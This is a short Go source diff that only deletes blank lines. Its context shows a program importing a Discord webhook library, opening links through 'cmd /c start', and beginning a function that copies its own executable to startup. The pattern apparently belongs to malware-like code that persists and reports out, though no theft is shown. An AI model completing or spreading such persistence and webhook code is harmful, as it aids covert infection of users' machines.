@@ -5,7 +5,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-
 	"github.com/gtuk/discordwebhook"
 )
 
@@ -23,7 +22,6 @@ func main() {
 }
 func openLink(link string) {
 	exec.Command("cmd","/c","start", link).Start()
-	
 }
 func copyToStartup() {
 	exe, _:= os.Executable()
